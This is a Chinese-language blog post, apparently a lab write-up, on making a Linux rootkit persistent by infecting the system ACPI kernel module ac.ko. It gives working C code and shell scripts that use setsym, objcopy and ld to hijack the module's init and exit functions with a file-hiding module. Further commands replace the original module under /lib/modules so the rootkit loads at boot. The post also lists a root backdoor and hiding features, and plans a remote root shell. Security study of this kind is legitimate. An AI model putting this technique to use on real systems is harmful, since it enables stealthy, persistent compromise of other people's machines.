---
category: rootkit
title: Linux Rootkit 实验 | 0003 Rootkit 感染关键内核模块实现持久化
---

# {{ page.title }}

## 实验说明

基于链接与修改符号表感染并劫持目标内核模块的初始函数与退出函数，使其成为寄生的宿主，实现隐蔽与持久性。

注：本次实验需要对`ELF`文件格式的了解作为基础。你可以阅读【相关文章】来认识`ELF`文件格式标准。后面将假设读者已经对`ELF`文件格式，尤其是`符号表`及`section`、`segment`的知识有了一定了解。

## 实验环境

```
uname -a:
Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux

GCC version:6.1.1
```

上述环境搭建于虚拟机，另外在没有特殊说明的情况下，均以 root 权限执行。

**注：后面实验参考的是4.10.10的源码（事实上，本次实验最好参考`4.6.0`版本的源码。从后面可以看到，这次从源码中获取的信息将直接用于编程，所以要确保版本正确）**

## 实验过程

**预备一**

从`LKM`的入口/出口函数说起。我们知道，既可以使用默认名称作为入口/出口函数名，也可以使用自己定义的名字。两种方法如下：

默认名：

{% highlight c %}
int init_module(void){...}

void cleanup_module(void){...}
{% endhighlight %}

自定义名：

{% highlight c %}
int test_init(void){...}
void test_exit(void){...}

module_init(test_init);
module_exit(test_exit);
{% endhighlight %}

第一种方法比第二种少了`module_init/module_exit`的注册过程。我们猜想，这个注册过程把`test_init`与`init_module`做了某种联系。

看一下源码`include/linux/module.h`:

{% highlight c %}
/* Each module must use one module_init(). */
#define module_init(initfn)					\
	static inline initcall_t __inittest(void)		\
	{ return initfn; }					\
	int init_module(void) __attribute__((alias(#initfn)));

/* This is only required if you want to be unloadable. */
#define module_exit(exitfn)					\
	static inline exitcall_t __exittest(void)		\
	{ return exitfn; }					\
	void cleanup_module(void) __attribute__((alias(#exitfn)));
{% endhighlight %}

上面的`alias`是 GCC 的拓展功能，给函数起别名并关联起来。所以最终被使用的还是`init_module/cleanup_module`这两个名字。

**预备二**

我们需要一个能够修改`ELF`文件符号表及链接的小工具`setsym`，它是由 novice 师傅根据`ELF`文件格式制作的。源码在[这里](https://github.com/NoviceLive/research-rootkit/tree/master/3-persistence/elf)

编译安装：

```
make
sudo make install
```

用法：

```
# 查看某个符号的值：
setsym <module_path> <symbol_name>
# 修改某个符号的值：
setsym <module_path> <symbol_name> <symbol_value>
```

**下面开始 dirty your hand !!**

我们的实验分为两步走：

1. 在同一模块中进行符号表修改
2. 模块寄生：修改合法内核模块符号表并注入带代码实现持久感染

**第一步**

首先编译生成一个简单模块：

{% highlight c %}
// noinj.c
static int lkm_init(void)
{
    printk("noinj: module loaded\n");
    return 0;
}
static void lkm_exit(void)
{
    printk("noinj: module removed\n");
    return;
}

module_init(lkm_init);
module_exit(lkm_exit);

int fake_init(void)
{
    lkm_init();
    printk("^_^ noinj init invoked\n");
    return 0;
}
int fake_exit(void)
{
    lkm_exit();
    printk("^_^ noinj exit removed\n");
    return 0;
}
{% endhighlight %}

注意，为了隐蔽，我们一般都会在假的入口/出口函数中调用真的相关函数。

看一下它的类型：

```
file noinj.ko
```

```
noinj.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=4f4000b40bf5d978fdac4d5e398e8ccca0165c2c, not stripped
```

它是一个可重定位文件。这里我们先了解一下模块的编译链接过程：

- 根据`noinj.c`生成`noinj.o`
- 编译器生成一个`noinj.mod.c`源文件
- 根据`noinj.mod.c`生成`noinj.mod.o`
- 将`noinj.o`与`noinj.mod.o`链接为`noinj.ko`

我们看一下`noinj.mod.c`，比较有意思的是下面几行：

{% highlight c %}
__visible struct module __this_module
__attribute__((section(".gnu.linkonce.this_module"))) = { 
    .name = KBUILD_MODNAME,
    .init = init_module,
#ifdef CONFIG_MODULE_UNLOAD
    .exit = cleanup_module,
#endif
    .arch = MODULE_ARCH_INIT,
};
{% endhighlight %}

`__this_module`即用来表示我们的模块的数据结构，它将被放在`.gnu.linkonce.this_module`节中。入口函数和出口函数都是默认的，其原因我们在**预备一**中已经解释过。

我们看一下`noinj.ko`的重定位记录，重点看`.gnu.linkonce.this_module`：

```
readelf -r noinj.ko
```

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-30.png)

再看一下符号表：

```
readelf -s noinj.ko
```

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-31.png)

为了更好地展示有用数据，我使用了一些命令行（如图中所示）来排除无关信息。

可以看到，目前`init_module/cleanup_module`分别与`lkm_init/lkm_exit`的值相同。如果我们把`init_module/cleanup_module`的值分别改为`fake_init/fake_exit`的值，则当模块加载进行符号解析和重定位时，它们就会分别被解析定位到`fake_init/fake_exit`上，从而导致假的入口/出口函数被执行。

为了方便，我们写一个脚本去自动化这个过程：

```
#!/bin/bash

make
cp noinj.ko infected.ko # 复制一份
setsym infected.ko init_module $(setsym infected.ko fake_init)
setsym infected.ko cleanup_module $(setsym infected.ko fake_exit)
```

测试结果：

加载原始模块`noinj.ko`：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-32.png)

加载修改后模块`infected.ko`：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-33.png)

可以看到，劫持生效。这里需要注意的是卸载模块时使用的还是旧模块的名称。这是因为模块本身的名字还是原来的，可以通过`readelf -s infected.ko`看到。

**第二步**

我们已经实现同模块入口出口劫持。这里，我们希望将一个模块的入口出口函数替换为另一个模块的入口出口函数。如果能够实现，我们就可以使用新的模块去替换`lib/modules/$(uname -r)/kernel/`下的某个开机加载模块，从而实现 rootkit 持久化。

为达到这个目的，有几个问题：

- 感染/替换哪个系统模块？

由于后面我们要进行测试，需要`rmmod`，所以最好找一个已加载但没有被使用的模块。我们可以在`lsmod`命令输出中找一个`Used`数为零的模块。后面将以`ac`模块为例。

`ac`模块的路径是`/lib/modules/$(uname -r)/kernel/drivers/acpi/ac.ko`。

- 怎样得知系统内核模块的入口/出口函数名？

一方面，我们可以在`readelf -s ac.ko`中找长得像的；

另一方面，我们可以在相应内核源码中找准确定义：

在`drivers/acpi/ac.c`中搜索`module_init`：

{% highlight c %}
module_init(acpi_ac_init);
module_exit(acpi_ac_exit);
{% endhighlight %}

具体的定义如下：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-29.png)

注意，这里的函数定义前都加了`__init`或`__exit`，这两个修饰前缀会把函数代码放到特殊的区域。所以，后面我们写寄生模块时也要给相关函数加上。另外，这两个函数前面都加了`static`，即符号只在本目标文件内可见，这一点在后面会讲到。

- 怎样用一个模块中符号的值去替换另一个模块中符号的值？

好了，宿主有了，入口出口函数也有了，关键点到了，我们怎么实现模块间感染？

回忆一下，`.ko`文件是可重定位文件，这意味着我们可以通过`ld`链接它们！

又有一个问题，上面提到宿主模块的入口/出口函数都有`static`标记，那么在`ld`时我们的寄生模块是无法获得它们的符号信息的，怎么办呢？

太巧了，有一个`objcopy`工具（`kali`上自带了，别的系统上如果没有可以手动安装，也可以不用工具自己手动修改）可以帮忙修改符号的属性，比如把`static`属性去掉。

一切都刚刚好，开始行动！

我们使用[ 00022 实验](https://brant-ruan.github.io/sec/2017/05/11/LinuxRootkitExp-00022.html)中的隐藏文件的模块来作为寄生模块。入口和出口函数做适当修改：

{% highlight c %}
// fileHid.c
extern int __init acpi_ac_init(void);
extern void __exit acpi_ac_exit(void);

__init int fshid_init(void)
{
    acpi_ac_init();
	...
}

__exit void fshid_exit(void)
{
    acpi_ac_exit();
	...
}
// module_init(fshid_init);
// module_exit(fshid_exit);
{% endhighlight %}

提醒一下，最后要注释掉`module_init`和`module_exit`呀！

将上述模块编译为`fileHid.ko`

```
#!/bin/bash

cp /lib/modules/$(uname -r)/kernel/drivers/acpi/ac.ko ./

# 修改 static 为全局变量
objcopy ac.ko gac.ko --globalize-symbol acpi_ac_init --globalize-symbol acpi_ac_exit

ld -r gac.ko fileHid.ko -o infected.ko

setsym infected.ko init_module $(setsym infected.ko fshid_init)
setsym infected.ko exit_module $(setsym infected.ko fshid_exit)
```

搞定，测试一下：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-34.png)

有效！

下面，我们进行重启开机测试：

先备份原`ac.ko`，再覆盖：

```
cd /lib/modules/$(uname -r)/kernel/drivers/acpi/
cp ./ac.ko ./ac.ko.bak
mv /root/Rootkit/04/realinj/infected.ko ./ac.ko
```

开机测试：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-27.png)

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-28.png)

## 实验思考

除去我们已经通过前几次实验学习到的`LKM`的知识外，本次实验最重要的知识点就是`ELF`文件的相关知识。事实上，novice 师傅在 Freebuf 的文章里还有第二部分：关于`ELF`格式解析的内容。

做完实验，我只想说，真正的 hack 建立在对目标的透彻了解上。

总结一下，到目前我们已经完成了以下功能：

- 隐藏文件
- 隐藏端口
- 隐藏自身加载痕迹
- 感染内核模块实现持久化
- 提供 root 后门
- 阻止其他内核模块加载
- 隐藏进程

需要说明的是，目前实现的【隐藏进程】功能有些鸡肋，`PID`要被硬编码进模块中才可以被隐藏。我想要的是一个能够动态指定`PID`并隐藏的功能。另外，【阻止其他内核模块加载】这一点和【感染内核模块实现持久化】结合起来也许会有问题：在开机启动时，也许会因为阻止了一些系统必要模块加载而导致系统出错，但尚未测试。另外，还缺少的一个功能是很重要的——提供一个远程`root shell`。

也就是说，至少还有三个子项目待完成：

- 实现动态隐藏进程
- 提供远程 root shell
- 整合各种功能，如隐藏提供远程 root shell 的进程及对应端口等。

## 参考资料

- [Linux Rootkit 系列五：感染系统关键内核模块实现持久化](http://www.freebuf.com/articles/system/109034.html)
- [NoviceLive/research-rootkit](https://github.com/NoviceLive/research-rootkit)
